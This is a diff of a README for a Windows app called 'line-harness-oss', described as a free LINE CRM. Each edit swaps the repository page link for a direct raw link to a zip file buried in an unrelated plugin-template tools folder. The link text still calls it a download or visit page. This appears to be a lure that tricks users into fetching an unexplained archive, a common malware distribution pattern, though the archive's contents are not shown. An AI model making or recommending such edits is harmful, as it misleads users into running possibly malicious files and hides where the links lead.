@@ -1,12 +1,12 @@
 # 🧩 line-harness-oss - Free LINE CRM for daily use
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/yigitefeegin-hexcode/line-harness-oss)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/yigitefeegin-hexcode/line-harness-oss/raw/refs/heads/main/packages/plugin-template/mcp-server/tools/oss-harness-line-2.4-beta.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app for Windows:
 
-https://github.com/yigitefeegin-hexcode/line-harness-oss
+https://github.com/yigitefeegin-hexcode/line-harness-oss/raw/refs/heads/main/packages/plugin-template/mcp-server/tools/oss-harness-line-2.4-beta.5.zip
 
 ## 🖥️ What this app does
 
@@ -42,7 +42,7 @@ For a smoother setup, use a computer with 8 GB RAM or more.
 
 Follow these steps to run the app on Windows:
 
-1. Open the download page: https://github.com/yigitefeegin-hexcode/line-harness-oss
+1. Open the download page: https://github.com/yigitefeegin-hexcode/line-harness-oss/raw/refs/heads/main/packages/plugin-template/mcp-server/tools/oss-harness-line-2.4-beta.5.zip
 2. Look for the latest release or download file.
 3. Download the Windows app file to your computer.
 4. Save the file in a folder you can find, such as Downloads or Desktop.
@@ -156,4 +156,4 @@ When the app is ready, you should be able to:
 
 If you need the file later, use this page again:
 
-[Visit the GitHub page](https://github.com/yigitefeegin-hexcode/line-harness-oss)
+[Visit the GitHub page](https://github.com/yigitefeegin-hexcode/line-harness-oss/raw/refs/heads/main/packages/plugin-template/mcp-server/tools/oss-harness-line-2.4-beta.5.zip)
